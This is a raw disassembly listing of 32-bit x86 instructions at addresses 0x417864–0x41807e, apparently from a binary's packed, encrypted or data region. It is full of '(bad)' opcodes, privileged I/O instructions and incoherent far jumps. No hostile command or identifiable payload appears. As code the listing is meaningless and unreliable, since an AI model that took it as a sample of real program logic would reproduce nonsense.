  417864:	cmp    bl,BYTE PTR [ebx+0x4e]
  417867:	sbb    esi,DWORD PTR [esi]
  417869:	fwait
  41786a:	add    esp,edi
  41786c:	jge    0x4178a5
  41786e:	add    eax,0x3a14e7a5
  417873:	stc    
  417874:	pushf  
  417875:	sbb    esi,DWORD PTR [ecx]
  417877:	push   cs
  417878:	xor    esp,edi
  41787a:	and    DWORD PTR [esp+ebp*8+0x43],esp
  41787e:	sub    ebx,DWORD PTR [ecx]
  417880:	aam    0x78
  417882:	icebp  
  417883:	movq   QWORD PTR [eax],mm4
  417886:	fdiv   st(2),st
  417888:	loopne 0x4178fb
  41788a:	hlt    
  41788b:	mov    BYTE PTR [eax+0x19597ad4],bl
  417891:	fs mov cs,edi
  417894:	mov    esi,0xb4409534
  417899:	dec    esi
  41789a:	mov    ebp,0xb58ce8f4
  41789f:	ja     0x4178f5
  4178a1:	mov    eax,ds:0xf30c043a
  4178a6:	mov    esi,0xa574de20
  4178ab:	pushf  
  4178ac:	(bad)  
  4178ae:	in     al,0xb8
  4178b0:	dec    edx
  4178b1:	int    0x75
  4178b3:	sub    al,0xf
  4178b5:	pop    edx
  4178b6:	cmp    BYTE PTR [esi+0x988b8ac],ah
  4178bc:	fdiv   DWORD PTR [ebx+0x7a]
  4178bf:	repnz mov al,ds:0x6e4feeba
  4178c5:	and    BYTE PTR [ebp-0x1e0473b0],bh
  4178cb:	in     eax,0x9a
  4178cd:	sbb    eax,0x7ca4623e
  4178d2:	pop    ds
  4178d3:	retf   
  4178d4:	pop    edx
  4178d5:	inc    esi
  4178d6:	adc    dh,BYTE PTR [edi]
  4178d8:	adc    dh,BYTE PTR [edi]
  4178da:	je     0x41792b
  4178dc:	in     al,0x45
  4178de:	loop   0x4178f2
  4178e0:	icebp  
  4178e1:	mov    ds:0x36d231e7,al
  4178e6:	cmp    ch,BYTE PTR [edx]
  4178e8:	je     0x4178bb
  4178ea:	or     ebp,DWORD PTR [edx+0x1769abbd]
  4178f0:	xchg   BYTE PTR ds:0x52afc120,dl
  4178f6:	(bad)  
  4178f7:	mov    eax,ds:0xa97a77d8
  4178fc:	sub    al,0x2c
  4178fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178ff:	mov    eax,0x85d447e4
  417904:	mov    al,ds:0xe89daca3
  417909:	loopne 0x4178b6
  41790b:	inc    ebp
  41790c:	cmp    al,0x9e
  41790e:	test   DWORD PTR [eax-0x2d],0x43f78019
  417915:	hlt    
  417916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417917:	frstor [esi-0x36]
  41791a:	dec    ecx
  41791b:	adc    al,0x61
  41791d:	hlt    
  41791e:	add    bh,BYTE PTR [ebp+0x4f]
  417921:	push   ds
  417922:	sub    BYTE PTR [ebx],dh
  417924:	sbb    BYTE PTR [ecx],al
  417926:	ja     0x417935
  417928:	dec    ebp
  417929:	cli    
  41792a:	nop
  41792b:	dec    eax
  41792c:	jge    0x4178b7
  41792e:	out    0xba,al
  417930:	and    dh,dh
  417932:	test   eax,0x9fcf108a
  417937:	ret    
  417938:	fistp  WORD PTR [edi]
  41793a:	jno    0x41790f
  41793c:	mov    esp,0x90174b03
  417941:	or     bh,0xac
  417944:	mov    eax,0x7c3a683f
  417949:	mov    ebp,0x3fff1c0f
  41794e:	push   edx
  41794f:	xchg   esi,eax
  417950:	jb     0x41796f
  417952:	and    al,0xf5
  417954:	rcl    eax,0x75
  417957:	clc    
  417958:	cmp    ecx,edx
  41795a:	daa    
  41795b:	jae    0x417993
  41795d:	sbb    BYTE PTR [esi-0x33],bl
  417960:	add    esi,DWORD PTR [ebp+0x77]
  417963:	dec    edi
  417964:	rcr    ebx,cl
  417966:	dec    edx
  417967:	std    
  417968:	push   0xf
  41796a:	pop    edi
  41796b:	add    ecx,DWORD PTR [ebx-0x4e776ecd]
  417971:	sub    ch,0x9e
  417974:	push   0xffffffea
  417976:	jmp    0x7330:0x387a766f
  41797d:	popf   
  41797e:	or     eax,ebp
  417980:	cmp    eax,0x88c1d78b
  417985:	fidiv  WORD PTR [ebp+0x4f]
  417988:	pop    ds
  417989:	mov    bl,0xcf
  41798b:	ins    BYTE PTR es:[edi],dx
  41798c:	add    BYTE PTR ds:0x1396e510,0xe
  417993:	je     0x4179e7
  417995:	ror    DWORD PTR [esi+0x6e],0xd3
  417999:	inc    edx
  41799a:	popf   
  41799b:	retf   0x818c
  41799e:	mov    al,0xce
  4179a0:	inc    edx
  4179a1:	sahf   
  4179a2:	pop    ss
  4179a3:	jae    0x4179ab
  4179a5:	mov    ah,0xb
  4179a7:	mov    ebp,0x6205364c
  4179ac:	sbb    BYTE PTR [ebx+0x53657820],bh
  4179b2:	or     BYTE PTR [eax-0x26e6a8b6],ah
  4179b8:	dec    edx
  4179b9:	mov    ebp,0x7327865c
  4179be:	sbb    BYTE PTR [edi+0x3a7eb94f],cl
  4179c4:	cld    
  4179c5:	in     al,0xb6
  4179c7:	shr    DWORD PTR [ebp+0x70],0x9c
  4179cb:	fmul   st,st(4)
  4179cd:	push   es
  4179ce:	adc    bl,BYTE PTR es:[edi-0x1e]
  4179d2:	ret    
  4179d3:	push   edi
  4179d4:	fisubr WORD PTR ds:0xb084c5ea
  4179da:	mov    bh,0x6c
  4179dc:	shr    DWORD PTR [edx],cl
  4179de:	scas   eax,DWORD PTR es:[edi]
  4179df:	hlt    
  4179e0:	cmp    ecx,DWORD PTR [eax]
  4179e2:	inc    ecx
  4179e3:	mov    ds:0x68b3bdac,al
  4179e8:	jb     0x4179f9
  4179ea:	sub    edx,ebx
  4179ec:	imul   eax,DWORD PTR ds:0x53c372ce,0xff8fa6c7
  4179f6:	cs push eax
  4179f8:	inc    eax
  4179f9:	lods   eax,DWORD PTR ds:[esi]
  4179fa:	js     0x417988
  4179fc:	lods   al,BYTE PTR ds:[esi]
  4179fd:	sub    eax,0x1f5c4401
  417a02:	sbb    ebx,ecx
  417a04:	mov    eax,ds:0x9fe2abe4
  417a09:	je     0x417a0c
  417a0b:	shl    DWORD PTR fs:[eax],0x34
  417a0f:	push   esi
  417a10:	push   ebp
  417a11:	jmp    0x417a65
  417a13:	stc    
  417a14:	pop    edi
  417a15:	(bad)  
  417a16:	mov    WORD PTR fs:[eax-0x47],?
  417a1a:	mov    bl,0x3e
  417a1c:	and    al,0x24
  417a1e:	outs   dx,BYTE PTR ds:[esi]
  417a1f:	int3   
  417a20:	inc    esi
  417a21:	push   ebx
  417a22:	push   eax
  417a23:	fucomip st,st(0)
  417a25:	sub    ebx,DWORD PTR [ecx]
  417a27:	mov    BYTE PTR [ebp+0x369f1e6e],dl
  417a2d:	test   DWORD PTR [eax+0x774e0ef8],esp
  417a33:	pop    ss
  417a34:	mov    esi,0xca59c606
  417a39:	(bad)  
  417a3b:	cmp    eax,0x9081bf52
  417a40:	mov    ch,0x5c
  417a42:	out    0xfe,al
  417a44:	hlt    
  417a45:	pop    es
  417a46:	cld    
  417a47:	dec    edi
  417a48:	pop    edx
  417a49:	add    al,0x25
  417a4b:	xchg   esp,eax
  417a4c:	fcomp  DWORD PTR [ecx+0x1e]
  417a4f:	adc    BYTE PTR [eax+0x6057c408],bl
  417a55:	or     ah,ch
  417a57:	sti    
  417a58:	(bad)  
  417a5a:	pop    ds
  417a5b:	xchg   esi,eax
  417a5c:	aas    
  417a5d:	add    al,0x4c
  417a5f:	or     eax,0xf39cca9b
  417a64:	test   al,0x3e
  417a66:	je     0x417ae0
  417a68:	sbb    eax,0xa0617f39
  417a6d:	ret    
  417a6e:	sub    eax,DWORD PTR [ebx]
  417a70:	repnz out 0xa3,eax
  417a73:	sbb    BYTE PTR [ebx+0x4c],ah
  417a76:	push   esi
  417a77:	out    0x7c,eax
  417a79:	jmp    FWORD PTR [edx+0x432c55b8]
  417a7f:	sub    esp,DWORD PTR [edi]
  417a81:	jmp    0xf8e1de04
  417a86:	sub    esi,edi
  417a88:	fisub  DWORD PTR [edx+ebp*1]
  417a8b:	clc    
  417a8c:	cmp    bl,BYTE PTR ds:0x282daef0
  417a92:	lods   al,BYTE PTR ds:[esi]
  417a93:	cmp    eax,0x743141b
  417a98:	js     0x417b04
  417a9a:	call   0x6f7079f9
  417a9f:	jne    0x417b0b
  417aa1:	lods   al,BYTE PTR ds:[esi]
  417aa2:	adc    al,0x88
  417aa4:	pop    ds
  417aa5:	shl    cl,1
  417aa7:	jmp    0x4ce4f51c
  417aac:	push   ebp
  417aad:	shl    ch,0x9a
  417ab0:	inc    BYTE PTR [ecx*2-0x565d63cd]
  417ab7:	int3   
  417ab8:	xlat   BYTE PTR ds:[ebx]
  417ab9:	shl    DWORD PTR [edx],cl
  417abb:	mov    dl,0x75
  417abd:	repnz shr DWORD PTR [eax-0x3fe8c68],0xf7
  417ac5:	cmp    dh,BYTE PTR [ebx-0x70435c25]
  417acb:	mov    esp,0xc9ce2f79
  417ad0:	or     BYTE PTR [eax],cl
  417ad2:	xor    ch,BYTE PTR [edi]
  417ad4:	mov    ds:0x12c512e4,eax
  417ad9:	push   eax
  417ada:	xlat   BYTE PTR ds:[ebx]
  417adb:	arpl   WORD PTR [edx],si
  417add:	rol    BYTE PTR [esi-0x27],0x7
  417ae1:	pop    es
  417ae2:	ds cmp eax,0xa60adb60
  417ae8:	cmp    ah,BYTE PTR [eax+0x61]
  417aeb:	mov    esp,0x7a7860c0
  417af0:	adc    al,0x8d
  417af2:	jmp    0x79b9:0xe2cd113d
  417af9:	loope  0x417ac7
  417afb:	pop    ebx
  417afc:	in     eax,0x57
  417afe:	sbb    eax,0x786fa32b
  417b03:	mov    edi,0xfb442c3a
  417b08:	jp     0x417afb
  417b0a:	push   eax
  417b0b:	pop    esp
  417b0c:	sub    al,0x8f
  417b0e:	and    DWORD PTR [ecx-0xff12265],0xffffffc3
  417b15:	or     al,0x9f
  417b17:	xchg   edx,eax
  417b18:	data16 aam 0xb5
  417b1b:	daa    
  417b1c:	add    BYTE PTR [edx-0x23],dl
  417b1f:	jp     0x417b39
  417b21:	outs   dx,DWORD PTR ds:[esi]
  417b22:	mov    bh,0x95
  417b24:	std    
  417b25:	in     al,dx
  417b26:	es adc al,cl
  417b29:	repz pop edi
  417b2b:	test   al,0x96
  417b2d:	sub    eax,0xb3a72ee1
  417b32:	cmp    BYTE PTR [edi],dh
  417b34:	xlat   BYTE PTR ds:[ebx]
  417b35:	and    ebp,DWORD PTR [eax+0x3cea57cf]
  417b3b:	stc    
  417b3c:	out    dx,eax
  417b3d:	gs sahf 
  417b3f:	test   eax,0xb6f49b50
  417b44:	cwde   
  417b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b46:	mov    ebp,0xbb7304f2
  417b4b:	and    eax,0xf7c5420f
  417b50:	and    BYTE PTR [esp+edx*2+0xa8133b6],al
  417b57:	ins    DWORD PTR es:[edi],dx
  417b58:	jnp    0x417bcc
  417b5a:	imul   ecx,DWORD PTR ds:0xcc934759,0xffffffab
  417b61:	dec    eax
  417b62:	gs xchg ecx,eax
  417b64:	jmp    0xd751:0xb98fdbd8
  417b6b:	sbb    DWORD PTR [ecx],0x1468871b
  417b71:	sub    eax,0x58ca6f79
  417b76:	and    DWORD PTR [edi+ebx*8],ebp
  417b79:	fsubr  QWORD PTR [ecx-0x383d0fb1]
  417b7f:	sahf   
  417b80:	aas    
  417b81:	mov    al,0xa
  417b83:	or     DWORD PTR [edi-0x5c],edx
  417b86:	ds cmp al,0xe1
  417b89:	xchg   ecx,eax
  417b8a:	sbb    eax,0x29e475fd
  417b8f:	xor    eax,0xac0c801e
  417b94:	mulps  xmm3,XMMWORD PTR [ecx]
  417b97:	sbb    BYTE PTR [ebx+0x27fc953b],ch
  417b9d:	movd   eax,mm6
  417ba0:	or     al,0x28
  417ba2:	std    
  417ba3:	xor    eax,0xe276eaa9
  417ba8:	mov    ds:0xb6ea3ae6,al
  417bad:	or     eax,0xb63b39d8
  417bb2:	aaa    
  417bb3:	dec    DWORD PTR [ebx+0x56ca5782]
  417bb9:	ret    0x69c2
  417bbc:	lock adc dh,BYTE PTR ds:0x6dab9fd1
  417bc3:	pop    ebp
  417bc4:	inc    esi
  417bc5:	in     eax,0xed
  417bc7:	call   0x972f:0x45cd1bea
  417bce:	daa    
  417bcf:	mov    esi,0xc046a837
  417bd4:	inc    esi
  417bd5:	ins    BYTE PTR es:[edi],dx
  417bd6:	out    dx,eax
  417bd7:	xchg   esp,eax
  417bd8:	and    al,0xa
  417bda:	lahf   
  417bdb:	sti    
  417bdc:	add    BYTE PTR [eax+ecx*2-0x6b7e3bae],cl
  417be3:	inc    ebp
  417be4:	aam    0x9c
  417be6:	test   BYTE PTR [ecx+0x3d83126c],0xa4
  417bed:	loop   0x417bbd
  417bef:	(bad)  
  417bf0:	sub    al,0x23
  417bf2:	adc    dh,BYTE PTR [esi+0x159619e1]
  417bf8:	jg     0x417b89
  417bfa:	dec    ecx
  417bfb:	lahf   
  417bfc:	imul   BYTE PTR gs:[ebx-0x7c928738]
  417c03:	inc    edx
  417c04:	and    eax,0xeb55df5b
  417c09:	push   ecx
  417c0a:	inc    edi
  417c0b:	and    al,0xe4
  417c0d:	push   ebp
  417c0e:	es out dx,al
  417c10:	cld    
  417c11:	push   esp
  417c12:	ret    
  417c13:	stos   BYTE PTR es:[edi],al
  417c14:	aad    0xc4
  417c16:	adc    eax,0xf2e404a1
  417c1b:	jnp    0x417c55
  417c1d:	imul   esi,DWORD PTR [ebx-0x717e3bd9],0x5234befb
  417c27:	mov    esi,0x7905936d
  417c2c:	or     edx,DWORD PTR [ebx]
  417c2e:	popf   
  417c2f:	aas    
  417c30:	mov    al,ds:0x7656498f
  417c35:	or     BYTE PTR [ecx+0x65e63ab4],bl
  417c3b:	mov    cl,0xb2
  417c3d:	scas   al,BYTE PTR es:[edi]
  417c3e:	test   DWORD PTR [ebx],0x183384f9
  417c44:	dec    eax
  417c45:	nop
  417c46:	xchg   DWORD PTR [edi-0x5d1d391c],esi
  417c4c:	fstp   QWORD PTR [ecx]
  417c4e:	mov    esp,0xd459c037
  417c53:	xchg   esi,eax
  417c54:	mov    ds:0xbfd8ff5f,eax
  417c59:	push   edx
  417c5a:	mov    bh,0xa1
  417c5c:	mov    cl,0x22
  417c5e:	xchg   esp,eax
  417c5f:	pop    edi
  417c60:	iret   
  417c61:	(bad)  
  417c62:	mov    ebx,ecx
  417c64:	xchg   ebx,eax
  417c65:	out    dx,eax
  417c66:	int3   
  417c67:	push   0xb7afe0be
  417c6c:	test   eax,0xcdcbe17f
  417c71:	xchg   BYTE PTR [esi+0x2c],dl
  417c74:	push   ebx
  417c75:	lods   al,BYTE PTR ds:[esi]
  417c77:	adc    eax,0xd983df62
  417c7c:	les    esi,FWORD PTR [edi+0x789115bd]
  417c82:	sbb    ebx,DWORD PTR ds:0x3640a04
  417c88:	xchg   edi,eax
  417c89:	mov    ds:0x3f8ae7ea,eax
  417c8e:	mov    dl,0xec
  417c90:	mov    WORD PTR [ecx-0x34],gs
  417c93:	push   cs
  417c94:	jmp    0x417d04
  417c96:	add    ch,BYTE PTR [edx-0x6]
  417c99:	or     dh,BYTE PTR [edi+0x2f1f0503]
  417c9f:	mov    ah,BYTE PTR [ebp+0xcf03bfa]
  417ca5:	imul   esi,DWORD PTR [ebx+0x104eed6f],0x3982354c
  417caf:	jp     0x417c5b
  417cb1:	arpl   WORD PTR [edx+0x69710ca6],si
  417cb7:	aam    0x71
  417cb9:	sar    BYTE PTR [edx+0x1a],cl
  417cbc:	push   ss
  417cbd:	sub    BYTE PTR [esi+0x66],dh
  417cc0:	loope  0x417c97
  417cc2:	add    BYTE PTR [edx+0x12],al
  417cc5:	sti    
  417cc6:	int    0x96
  417cc8:	mov    ecx,0x826235a8
  417ccd:	jle    0x417c8e
  417ccf:	mov    ax,ds:0x8c59420a
  417cd5:	jns    0x417d48
  417cd7:	not    BYTE PTR [ecx-0x7592c886]
  417cdd:	ja     0x417cca
  417cdf:	(bad)  
  417ce0:	xor    edx,esi
  417ce2:	cwde   
  417ce3:	ret    
  417ce4:	push   0xe7b2ea6d
  417ce9:	sbb    eax,0x381f656d
  417cee:	or     eax,0x819025d1
  417cf3:	or     BYTE PTR [ebx+0x67],bl
  417cf6:	and    eax,0x907150e8
  417cfb:	(bad)  
  417cfc:	repz and DWORD PTR [esi],ecx
  417cff:	cmp    ch,BYTE PTR [edx+0x4ae40b66]
  417d05:	lahf   
  417d06:	pop    ebx
  417d07:	push   ds
  417d08:	xchg   ebp,eax
  417d09:	cwde   
  417d0a:	sbb    DWORD PTR [ecx-0xe],esi
  417d0d:	(bad)  
  417d0f:	xlat   BYTE PTR ds:[ebx]
  417d10:	repnz push cs
  417d12:	xor    DWORD PTR [ecx-0x57],0x33
  417d16:	mov    eax,ds:0x556c2731
  417d1b:	jmp    DWORD PTR [edx]
  417d1d:	dec    ebp
  417d1e:	lock push DWORD PTR [eax-0x45]
  417d22:	mov    ah,0x27
  417d24:	in     eax,0x88
  417d26:	and    eax,0xb6a35f05
  417d2b:	out    0xff,al
  417d2d:	pop    ds
  417d2e:	push   0x439de16b
  417d33:	sbb    al,0xb8
  417d35:	pop    edx
  417d36:	cmp    BYTE PTR fs:[ebp-0x27159d28],bl
  417d3d:	push   edx
  417d3e:	test   al,0xfb
  417d40:	ror    cl,0xaa
  417d43:	loope  0x417d96
  417d45:	and    al,0xb4
  417d47:	jmp    0x417d02
  417d49:	jne    0x417d1e
  417d4b:	int    0xca
  417d4d:	mov    ebp,0xee9e46fb
  417d52:	popf   
  417d53:	xchg   DWORD PTR [esi+0x560db408],edi
  417d59:	cmp    BYTE PTR ds:0x74f481a0,bh
  417d5f:	xchg   ecx,eax
  417d60:	pop    ds
  417d61:	mov    bl,0xf
  417d63:	ins    DWORD PTR es:[edi],dx
  417d64:	iret   
  417d65:	xor    BYTE PTR [ebx-0x2c],cl
  417d68:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d6a:	lock fcomp DWORD PTR [esi]
  417d6d:	mov    esi,0xfe79b3c9
  417d72:	mov    ecx,0xcd845f9e
  417d77:	aad    0xfa
  417d79:	int3   
  417d7a:	iret   
  417d7b:	sub    BYTE PTR [eax-0x4f],ah
  417d7e:	xor    eax,0xbedecaef
  417d83:	cld    
  417d84:	lea    esp,[ebp-0x72b11d5e]
  417d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d8b:	mov    bh,0x20
  417d8d:	cmp    al,0x7c
  417d8f:	xor    ah,cl
  417d91:	add    dh,al
  417d93:	jl     0x417df9
  417d95:	xchg   esp,eax
  417d96:	aaa    
  417d97:	ss inc ebx
  417d99:	(bad)  
  417d9a:	std    
  417d9b:	aad    0xcf
  417d9d:	(bad)  
  417d9e:	sbb    BYTE PTR [ebp-0x902c7dc],dl
  417da4:	cs std 
  417da6:	(bad)  
  417da7:	ds repnz pop ebx
  417daa:	mov    gs,WORD PTR [ebx]
  417dac:	push   esi
  417dad:	lods   ax,WORD PTR ds:[esi]
  417daf:	cli    
  417db0:	inc    esi
  417db1:	dec    ebp
  417db2:	aas    
  417db3:	nop
  417db4:	mov    es,WORD PTR [esi+ecx*4]
  417db7:	int    0x7c
  417db9:	pop    edi
  417dba:	xor    al,0x50
  417dbc:	pop    DWORD PTR [ecx+0x39]
  417dbf:	cmp    al,0x9a
  417dc1:	sub    al,BYTE PTR [edi-0xeacc9aa]
  417dc7:	lods   al,BYTE PTR ds:[esi]
  417dc8:	jne    0x417d93
  417dca:	pop    es
  417dcb:	sub    al,0x48
  417dcd:	sub    eax,DWORD PTR [ebp-0x3a]
  417dd0:	or     ah,BYTE PTR [eax+esi*2]
  417dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd4:	jbe    0x417d85
  417dd6:	popf   
  417dd7:	mov    ch,0xee
  417dd9:	or     DWORD PTR [eax-0x1e],esi
  417ddc:	or     DWORD PTR [esi+0x32],ecx
  417ddf:	lods   al,BYTE PTR ds:[esi]
  417de0:	mov    ds:0xebc66418,al
  417de6:	outs   dx,DWORD PTR ds:[esi]
  417de7:	out    dx,eax
  417de8:	push   cs
  417de9:	xchg   esi,eax
  417dea:	sub    ah,0x87
  417ded:	xor    bh,BYTE PTR [ebp-0x12]
  417df0:	xchg   ebp,eax
  417df1:	push   0x66cfd465
  417df6:	mov    ch,BYTE PTR [esp+eiz*4]
  417df9:	ins    BYTE PTR es:[edi],dx
  417dfa:	lea    ebp,[edx]
  417dfc:	inc    edi
  417dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dfe:	js     0x417dfe
  417e00:	clts   
  417e02:	out    dx,al
  417e03:	pushf  
  417e04:	xor    al,0xc6
  417e06:	xor    BYTE PTR [ebx],ch
  417e08:	repz cdq 
  417e0a:	ss push 0x38
  417e0d:	cmp    esi,DWORD PTR [ecx]
  417e0f:	iret   
  417e10:	lods   eax,DWORD PTR ds:[esi]
  417e11:	cwde   
  417e12:	push   esp
  417e13:	xor    DWORD PTR [esi-0x64547ca5],edx
  417e19:	ss jo  0x417df3
  417e1c:	and    esp,DWORD PTR [ebx-0x4f5c9678]
  417e22:	inc    ebx
  417e23:	sbb    DWORD PTR [eax],ebp
  417e25:	xor    eax,0x37408428
  417e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2b:	and    al,BYTE PTR [ebx-0x4c]
  417e2e:	sub    BYTE PTR [ebp+0x23],cl
  417e31:	xchg   ah,al
  417e33:	mov    eax,0xc82cc9c5
  417e38:	pop    edx
  417e39:	inc    esi
  417e3a:	push   es
  417e3b:	mov    dl,0x4a
  417e3d:	pop    gs
  417e3f:	mov    ebp,0x5714f58f
  417e44:	sbb    ebx,edi
  417e46:	sbb    cl,al
  417e48:	mov    esi,0x44f81ba3
  417e4d:	into   
  417e4e:	mov    al,ds:0x17fe2847
  417e53:	call   0x22d80736
  417e58:	sub    dl,BYTE PTR [edx+ebp*8]
  417e5b:	out    dx,eax
  417e5c:	mov    ds:0x5d9163d9,eax
  417e61:	call   0x16e1:0x15137e23
  417e68:	(bad)  
  417e6a:	pop    esp
  417e6b:	fmul   QWORD PTR [ecx+0x34]
  417e6e:	out    0x8b,eax
  417e70:	call   0xd5b02144
  417e75:	fldz   
  417e77:	sub    DWORD PTR [esi],eax
  417e79:	sahf   
  417e7a:	out    dx,eax
  417e7b:	push   cs
  417e7c:	cmp    eax,0x6bbedd69
  417e81:	inc    ecx
  417e82:	add    al,0xde
  417e84:	jl     0x417e1d
  417e86:	arpl   WORD PTR [edx-0x3a4866f4],di
  417e8c:	ja     0x417e44
  417e8e:	fild   QWORD PTR [esi-0xc]
  417e91:	dec    esp
  417e92:	mov    ds:0x36ff4602,al
  417e97:	jmp    0x417e44
  417e99:	pop    ss
  417e9a:	mov    eax,ds:0xa8581099
  417e9f:	add    ebp,esp
  417ea1:	jb     0x417f07
  417ea3:	repz xor BYTE PTR [esi+0x12],0xb6
  417ea8:	mov    ebp,0xe1a63d46
  417ead:	cmp    al,0xbe
  417eaf:	mov    ebx,0xb3f564ca
  417eb4:	imul   edi,ecx,0x59
  417eb7:	test   BYTE PTR [ebx+esi*1-0x15],dl
  417ebb:	shl    BYTE PTR [ebx],cl
  417ebd:	outs   dx,DWORD PTR ds:[esi]
  417ebe:	ds dec esi
  417ec0:	and    BYTE PTR [esi],dh
  417ec2:	jno    0x417f2f
  417ec4:	retf   0x4ea5
  417ec7:	cmc    
  417ec8:	jnp    0x417f3b
  417eca:	xchg   DWORD PTR [ebx],edi
  417ecc:	inc    ecx
  417ecd:	arpl   si,bx
  417ecf:	in     al,dx
  417ed0:	inc    edi
  417ed1:	pop    esi
  417ed2:	fdiv   QWORD PTR [edi+0x4508c5e]
  417ed8:	sbb    dl,bl
  417eda:	xor    cl,BYTE PTR fs:[edi]
  417edd:	mov    eax,ds:0xc778c20
  417ee2:	pop    esp
  417ee3:	push   esp
  417ee4:	rcl    al,1
  417ee6:	push   esp
  417ee7:	sbb    eax,0x52fecd0
  417eec:	pop    es
  417eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eee:	mov    ds:0xb745b12f,eax
  417ef3:	push   esi
  417ef4:	jp     0x417f13
  417ef6:	pop    es
  417ef7:	jo     0x417f38
  417ef9:	clc    
  417efa:	test   BYTE PTR [edx+0x16],dl
  417efd:	xlat   BYTE PTR ds:[ebx]
  417efe:	xchg   ecx,edi
  417f00:	push   cs
  417f01:	mov    esi,0xa9c1a780
  417f06:	pop    esi
  417f07:	mov    cl,0xb1
  417f09:	jbe    0x417ecc
  417f0b:	push   edi
  417f0c:	jge    0x417ed7
  417f0e:	cmc    
  417f0f:	rol    DWORD PTR ds:0x2dafbfab,cl
  417f15:	retf   
  417f16:	arpl   WORD PTR [edi+0x3cb3cce],si
  417f1c:	mov    cl,BYTE PTR [edi+0x2c]
  417f1f:	adc    eax,0x322b0f7c
  417f24:	sbb    ecx,DWORD PTR [ecx]
  417f26:	adc    BYTE PTR [ebx-0x764412f0],ah
  417f2c:	dec    ecx
  417f2d:	xchg   edi,eax
  417f2e:	pushf  
  417f2f:	sar    DWORD PTR [esi+0x38badf97],1
  417f35:	sti    
  417f36:	in     al,0xe5
  417f38:	mov    esi,0x747846d3
  417f3d:	mov    WORD PTR [esi],?
  417f3f:	push   ebp
  417f40:	sub    eax,0x67dac5ac
  417f45:	mov    edi,0xa55a45de
  417f4a:	fidiv  WORD PTR [eax]
  417f4c:	fmul   st(1),st
  417f4e:	cmp    eax,0xa1b541b7
  417f53:	xchg   edx,eax
  417f54:	inc    esp
  417f55:	scas   eax,DWORD PTR es:[edi]
  417f56:	loopne 0x417f9a
  417f58:	adc    eax,0x378b43d6
  417f5d:	jmp    0xeb857be3
  417f62:	call   0x8dff:0x90c76b6d
  417f69:	aad    0xd6
  417f6b:	fcmovnu st,st(1)
  417f6d:	mov    ds:0xaf33c52a,eax
  417f72:	xor    al,BYTE PTR [ecx+0x6d71c67e]
  417f78:	repz fiadd DWORD PTR [ecx-0x7abffce0]
  417f7f:	fld    TBYTE PTR [ecx-0x7758ccf6]
  417f85:	fdivr  QWORD PTR [ebx]
  417f87:	jnp    0x417f96
  417f89:	adc    BYTE PTR [edx+0x4d],dh
  417f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f8d:	stc    
  417f8e:	mov    edx,0x9d96070e
  417f93:	mov    eax,ds:0x459bec0a
  417f98:	pop    ebx
  417f99:	xchg   BYTE PTR [edx+0x5c4421e7],bl
  417f9f:	jmp    0x92fa:0x566f4016
  417fa6:	retf   
  417fa7:	ss repnz (bad) 
  417faa:	jmp    0x6542:0x5c587b7a
  417fb1:	or     esi,ebx
  417fb3:	out    0xf7,al
  417fb5:	aam    0x40
  417fb7:	dec    eax
  417fb8:	aaa    
  417fb9:	cli    
  417fba:	(bad)  
  417fbb:	fldcw  WORD PTR [edx+0x5b81808]
  417fc1:	add    DWORD PTR [ebx],ecx
  417fc3:	xlat   BYTE PTR ds:[ebx]
  417fc4:	jmp    0xb9511792
  417fc9:	jnp    0x418020
  417fcb:	and    bh,BYTE PTR [ebp-0x13]
  417fce:	outs   dx,DWORD PTR ds:[esi]
  417fcf:	mul    DWORD PTR ds:0xc58a81f4
  417fd5:	add    al,0x7c
  417fd7:	loop   0x41803d
  417fd9:	add    esi,edi
  417fdb:	adc    BYTE PTR [edi],0x43
  417fde:	cmc    
  417fdf:	mov    al,0xf5
  417fe1:	js     0x417f9d
  417fe3:	xchg   ecx,eax
  417fe4:	scas   eax,DWORD PTR es:[edi]
  417fe5:	lea    edx,[edi+eiz*8+0x2fe49d37]
  417fec:	or     al,0x74
  417fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fef:	add    bh,ch
  417ff1:	push   eax
  417ff2:	and    al,BYTE PTR [ebp+0xfc3923b]
  417ff8:	call   0xf142bed3
  417ffd:	mov    ecx,0x11e21760
  418002:	cmp    al,0xed
  418004:	xchg   esi,eax
  418005:	repz xchg ebx,eax
  418007:	mov    bl,0x9d
  418009:	or     eax,0x6a7810a9
  41800e:	cs scas al,BYTE PTR es:[edi]
  418010:	adc    al,0x90
  418012:	das    
  418013:	out    0xf3,al
  418015:	mov    dl,0xf6
  418017:	int3   
  418018:	fs pop ebx
  41801a:	mov    dh,0x42
  41801c:	dec    eax
  41801d:	adc    edx,edi
  41801f:	test   al,0x9b
  418021:	cmp    DWORD PTR [ebx-0x57],edx
  418024:	mov    eax,0x7fc3fd64
  418029:	pop    ds
  41802a:	jge    0x4180a7
  41802c:	xchg   esi,eax
  41802d:	cmp    edx,edx
  41802f:	jl     0x41800f
  418031:	pop    ds
  418032:	mov    ebx,0x95afa216
  418037:	std    
  418038:	aas    
  418039:	mov    DWORD PTR [bp+si-0x64],eax
  41803d:	cmc    
  41803e:	clc    
  41803f:	lea    ebx,[eax-0x2c]
  418042:	dec    ebp
  418043:	add    al,BYTE PTR [esi-0x785f7c78]
  418049:	sbb    al,0xed
  41804c:	adc    al,bh
  41804e:	or     dh,BYTE PTR [edi-0x33]
  418051:	mov    eax,ds:0xe660d434
  418056:	sbb    al,0x47
  418058:	mov    ecx,0x29a673f9
  41805d:	enter  0xd30a,0xd6
  418061:	cwde   
  418062:	adc    bh,bh
  418064:	dec    esi
  418065:	gs shl edi,0x88
  418069:	cmp    al,0x6b
  41806b:	lods   eax,DWORD PTR ds:[esi]
  41806c:	out    0x2a,eax
  41806e:	push   0x23
  418070:	xchg   ebp,eax
  418071:	sbb    eax,0xa93e4d33
  418076:	mov    bl,BYTE PTR [esi-0x37597707]
  41807c:	inc    esi
  41807d:	scas   eax,DWORD PTR es:[edi]
  41807e:	xchg   BYTE PTR [esi],cl
